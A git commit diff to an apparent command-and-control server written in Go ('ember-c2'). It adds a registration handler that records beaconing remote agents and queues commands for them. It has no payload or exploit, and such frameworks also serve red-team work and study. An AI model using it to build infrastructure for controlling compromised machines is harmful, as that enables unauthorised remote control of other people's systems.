4bca9a8e5ad183e8cb6e25f3c261c25c27707bdb
ash <ash.tise24@gmail.com>
2025-11-25 22:33:02 -0700

    Finish handleRegister func

--- cmd/server/main.go
+++ cmd/server/main.go
@@ -1,14 +1,21 @@
 package main
 
 import (
+	"crypto/rand"
+	"encoding/hex"
 	"encoding/json"
 	"io"
 	"log"
 	"net/http"
 	"os"
+	"sync"
+	"time"
 
 	"github.com/ash-tise/ember-c2/internal/proto"
 )
+
+var activeAgents = make(map[string]*proto.AgentMetadata)
+var agentMutex sync.Mutex
 
 func initLogger() {
 
@@ -29,10 +36,9 @@ func initLogger() {
 
 func handleRegister(w http.ResponseWriter, r *http.Request) {
 
+	// grab beacon info from agent
 	var initBeacon proto.Beacon
-
 	decoder := json.NewDecoder(r.Body)
-
 	if err := decoder.Decode(&initBeacon); err != nil {
 		log.Printf("ERROR: handleRegister: Failed to decode initBeacon JSON: %v", err)
 		http.Error(w, "Invalid request format", http.StatusBadRequest)
@@ -40,8 +46,32 @@ func handleRegister(w http.ResponseWriter, r *http.Request) {
 	}
 
 	defer r.Body.Close()
-
 	log.Println("OPERATIONAL: Received registration attempt from Host:", initBeacon.Hostname)
+
+	// generate random agentID and send back to the agent
+	buffer := make([]byte, 16)
+	if _, err := rand.Read(buffer); err != nil {
+		log.Printf("FATAL INTERNAL ERROR: crypto/rand failure: %v", err)
+		http.Error(w, "Service Unavailable", http.StatusInternalServerError)
+		return
+	}
+	initBeacon.AgentID = hex.EncodeToString(buffer)
+
+	// store new agent information on the server
+	newAgent := proto.AgentMetadata{
+		AgentID:      initBeacon.AgentID,
+		Hostname:     initBeacon.Hostname,
+		OS:           initBeacon.OS,
+		LastCheckIn:  time.Now(),
+		CommandQueue: make(chan proto.Command, 10)}
+
+	// add new agent to activeAgents map
+	agentMutex.Lock()
+	defer agentMutex.Unlock()
+	activeAgents[initBeacon.AgentID] = &newAgent
+
+	// return agentID to agent
+	w.Write([]byte(initBeacon.AgentID))
 }
 
 func main() {
